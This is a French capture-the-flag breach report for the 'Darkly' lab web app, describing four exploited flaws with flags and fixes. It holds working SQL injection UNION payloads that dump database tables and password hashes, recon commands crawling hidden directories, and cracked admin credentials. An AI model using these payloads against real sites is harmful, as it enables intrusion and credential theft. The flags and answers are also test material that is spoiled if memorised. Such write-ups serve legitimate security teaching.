# Darkly - Breach Report

| # | Breach | Flag |
|---|--------|------|
| 1 | HiddenFiles | d5eec3ec36cf80dce44a896f961c1831a05526ec215693c8f2c39543497d4466 |
| 2 | Admin Panel | d19b4823e0d5600ceed56d5e896ef328d7a2b9e7ac7e80f4fcdb9b10bcb3e7ff |
| 3 | SQL Injection (searchimg) | 10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5 |
| 4 | Brute Force (signin) | B3A6E43DDF8B4BBB4125E5E7D23040433827759D4DE1C04EA63907479A80A6B2 |

---

### Breach 1 - HiddenFiles
**Flag** : `d5eec3ec36cf80dce44a896f961c1831a05526ec215693c8f2c39543497d4466`

**Vulnerabilité** : Information disclosure via robots.txt

**Méthode** :
1. nmap révèle un fichier `robots.txt` avec 2 entrées Disallow : `/whatever` et `/.hidden`
2. Le robots.txt est censé dire aux crawlers de ne pas indexer ces chemins, mais il révèle leur existence à un attaquant
3. `wget -r -np -l 10 -e robots=off http://192.168.1.103/.hidden/` crawle récursivement le répertoire
4. `find . -name "README" -exec grep -l "flag" {} \;` trouve le README contenant le flag parmi des centaines de faux

**Fix** : Ne jamais lister de chemins sensibles dans robots.txt. Si un répertoire doit être inaccessible, le protéger côté serveur (auth, permissions) pas juste le cacher.

---

### Breach 2 - Admin Panel
**Flag** : `d19b4823e0d5600ceed56d5e896ef328d7a2b9e7ac7e80f4fcdb9b10bcb3e7ff`

**Vulnerabilité** : Credentials exposés + mot de passe faible

**Méthode** :
1. nikto détecte `/admin/index.php` et `/.htpasswd` accessibles publiquement
2. `curl http://192.168.1.103/whatever/` révèle un fichier `.htpasswd` contenant `root:437394baff5aa33daa618be47b75cb49`
3. Le hash MD5 est cracké instantanément sur crackstation.net : `qwerty123@`
4. Connexion sur `/admin/index.php` via HTTP Basic Auth avec `root:qwerty123@`

**Fix** : Ne jamais exposer un `.htpasswd` publiquement. Utiliser bcrypt au lieu de MD5 pour hasher les mots de passe. Choisir des mots de passe forts.

---

### Breach 3 - SQL Injection (searchimg)
**Flag** : `10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5`

**Vulnerabilité** : SQL Injection (OWASP A03)

**Méthode** :
1. `/?page=searchimg` prend un numéro d'image en input, directement injecté dans la requête SQL
2. `1 OR 1=1` confirme l'injection (retourne toutes les images)
3. `1 UNION SELECT NULL, NULL` détermine que la requête retourne 2 colonnes
4. `1 UNION SELECT table_schema, table_name FROM information_schema.tables` liste toutes les bases et tables
5. On trouve `Member_Sql_Injection.users` avec une colonne `countersign`
6. `1 UNION SELECT Commentaire, countersign FROM Member_Sql_Injection.users` extrait le hash du user "Flag"
7. Hash MD5 `5ff9d0165b4f92b14994e5c685cdce28` cracké -> `FortyTwo` -> lowercase -> SHA256

**Fix** : Utiliser des prepared statements. Jamais concatener l'input utilisateur directement dans une requête SQL.

---

### Breach 4 - Brute Force (signin)
**Flag** : `B3A6E43DDF8B4BBB4125E5E7D23040433827759D4DE1C04EA63907479A80A6B2`

**Vulnerabilité** : Credentials faibles sur le formulaire de login (pas de rate limiting, mot de passe trivial)

**Méthode** :
1. Via la SQL injection (breach 3), on liste toutes les bases de données
2. `Member_Brute_Force.db_default` contient une table avec `username` et `password`
3. `1 UNION SELECT username, password FROM Member_Brute_Force.db_default` extrait `admin:3bf1114a986ba87ed28fc1b5884fc2f8`
4. Hash MD5 cracké -> `shadow`
5. Connexion sur `/?page=signin` avec `admin:shadow`

**Fix** : Rate limiting sur les tentatives de login, mots de passe forts, ne pas stocker les passwords en MD5.